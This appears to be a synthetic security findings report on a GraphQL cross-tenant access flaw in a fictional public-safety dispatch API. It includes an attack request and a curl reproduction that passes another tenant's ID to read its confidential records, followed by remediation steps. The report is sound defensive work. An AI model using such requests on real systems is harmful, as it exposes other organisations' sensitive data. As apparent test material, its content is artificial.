# Security Analysis Report
**System:** FirstResponse CAD Integration — v5.2.9 (FINAL)
**Domain:** Government / Public Safety
**Example ID:** GQL-0258
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Injection — Pattern 5.2 | Resolver/graph traversal injection — attacker traverses `listResources` to access public safety dispatch records across tenant boundaries |

---

## Finding 1 — Injection: Resolver/Graph Traversal Across Tenant Boundary (Pattern 5.2)

### Summary
The `listResources` GraphQL query on FirstResponse CAD Integration (`api.firstresponse-cad-in.example.com`) accepts a caller-supplied `tenantId` argument, enabling a resolver/graph traversal injection attack. Per §5.0 Pattern 5.2, the resolver chain does not re-validate authorization at each resolution step — an attacker authenticated to `tenant-28d2` supplies `tenantId: "tenant-dbe9"` and traverses into victim tenant's dispatch records. In a government / public safety context, resource records may represent Computer-Aided Dispatch (CAD) entries, incident reports, first responder assignments, and sensitive law enforcement PII.

**HAR artifact note:** The request uses `listResources(tenantId: "tenant-dbe9")` but the response JSON key is `getResource`. This inconsistency exists in context.txt §6.0 and is documented as-is.

**Pattern:** 5.2 — Resolver/graph traversal injection (Injection)
**Affected resolver:** `listResources(tenantId: ID, status: String)`
**Affected endpoint:** `POST https://api.firstresponse-cad-in.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.firstresponse-cad-in.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
x-tenant-id: tenant-28d2
Content-Type: application/json

{"query": "query VulnerableOp { listResources(tenantId: \"tenant-dbe9\") { resourceId ownerId data { sensitiveField } } }"}
```

**Response — Victim CAD Dispatch Data Returned**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-dbe9",
      "ownerId": "other-user-28d2dbe9",
      "data": {
        "sensitiveField": "CONFIDENTIAL-28d2dbe9",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
Note: `x-request-id: req-28d2dbe9` is a server-assigned **response** header (§6.0 response.headers). It is not part of the attack request.

### Evidence Map

| Artifact Location | Key Detail |
|---|---|
| §2.0 Architecture | Redis cache keyed by `resourceId` only — no tenant dimension |
| §3.0 Schema | `listResources(tenantId: ID)` — `tenantId` is optional, caller-supplied |
| §4.0 RISK-GQL-258 | `getResource` resolver fetches by `resourceId` only; no tenancy check |
| §5.0 Pattern 5.2 | Resolver/graph traversal — no re-validation at each resolution step |
| HAR request | Attacker `tenant-28d2` injects `tenantId: "tenant-dbe9"` into query argument |
| HAR response | `CONFIDENTIAL-28d2dbe9` and `internalNotes` from public safety tenant returned |

---

## Steps to Reproduce

```bash
# Authenticate as attacker (tenant-28d2)
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"

# Inject victim tenantId into listResources argument
# x-request-id is server-assigned and appears in the response only; not sent in the request
curl -s -X POST https://api.firstresponse-cad-in.example.com/graphql \
  -H "Authorization: Bearer $TOKEN" \
  -H "x-tenant-id: tenant-28d2" \
  -H "Content-Type: application/json" \
  -d '{"query":"query VulnerableOp { listResources(tenantId: \"tenant-dbe9\") { resourceId ownerId data { sensitiveField } } }"}'

# Expected (vulnerable): Returns CONFIDENTIAL-28d2dbe9 and dispatch records from tenant-dbe9
# Expected (secure): { "errors": [{ "message": "Forbidden" }], "data": { "listResources": null } }
```

---

## Remediation

1. **Derive `tenantId` from JWT only:** In `listResources`, ignore the caller-supplied `tenantId` argument — enforce `WHERE tenant_id = $jwtTenantId` at every resolver level.
2. **`getResource` check (§4.0 RISK-GQL-258):** `WHERE resource_id = $id AND tenant_id = $jwtTenantId`.
3. **Re-validate at each resolver step:** For nested object traversal (`getResourceWithChildren`), re-assert tenant ownership at each child resolver — do not propagate parent authorization implicitly.
4. **Cache keying:** Include `tenantId` in Redis key: `resource:{tenantId}:{resourceId}`.
5. **Government / public safety note:** CAD dispatch records contain first responder location data, incident coordinates, and civilian PII. Unauthorized access constitutes a criminal justice information security violation under CJIS Security Policy.
